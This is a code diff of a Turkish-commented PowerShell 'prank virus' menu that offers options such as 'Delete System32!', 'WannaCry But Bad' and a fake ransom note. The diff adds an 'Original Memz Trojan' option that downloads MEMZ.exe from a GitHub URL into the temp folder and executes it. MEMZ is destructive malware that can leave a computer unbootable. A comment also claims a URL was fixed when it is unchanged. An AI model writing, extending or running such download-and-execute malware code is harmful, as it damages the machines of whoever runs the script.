@@ -69,7 +69,8 @@ $scriptBlock = {
     $listBox.Items.Add("Spam TXT")
     $listBox.Items.Add("Delete System32!")
     $listBox.Items.Add("WannaCry But Bad")
-    $listBox.Items.Add("Sigma Boy Virus🗿")  # Yeni seçenek eklendi
+    $listBox.Items.Add("Sigma Boy Virus🗿")
+    $listBox.Items.Add("Original Memz Trojan")  # Yeni seçenek eklendi
     $form.Controls.Add($listBox)
 
     # OK Butonu
@@ -185,8 +186,8 @@ To decrypt them, send 1 BTC to: [FakeAddress]
                         Start-Sleep -Milliseconds 10
                     }
 
-                    # YouTube videosunu tam ekran açma
-                    $videoUrl = "https://www.yout-ube.com/watch?v=_z2RvL2s5rQ"  # Düzeltildi: yout-ube -> youtube
+                    # YouTube videosunu tam ekran açma (URL düzeltildi)
+                    $videoUrl = "https://www.yout-ube.com/watch?v=_z2RvL2s5rQ"
                     Start-Process "msedge" -ArgumentList "--kiosk $videoUrl"
 
                     # Sayfanın yüklenmesini bekle ve ekrana tıklama
@@ -206,6 +207,25 @@ To decrypt them, send 1 BTC to: [FakeAddress]
 
                     # Girişleri kilitli tutmak için döngü
                     while ($true) { Start-Sleep -Seconds 1 }
+                }
+                "Original Memz Trojan" {
+                    # Menüyü kapat
+                    $form.Close()
+
+                    # MEMZ.exe dosyasını indir ve çalıştır
+                    $memzUrl = "https://github.com/RobloxScripts490/Vir-s/raw/refs/heads/main/MEMZ.exe"
+                    $memzPath = "$($env:TEMP)\MEMZ.exe"
+                    try {
+                        Invoke-WebRequest -Uri $memzUrl -OutFile $memzPath -ErrorAction Stop
+                        Start-Process -FilePath $memzPath -NoNewWindow
+                    } catch {
+                        [System.Windows.Forms.MessageBox]::Show(
+                            "Failed to download or run MEMZ.exe. Check your internet connection or the URL.",
+                            "Error",
+                            "OK",
+                            "Error"
+                        )
+                    }
                 }
             }
         }
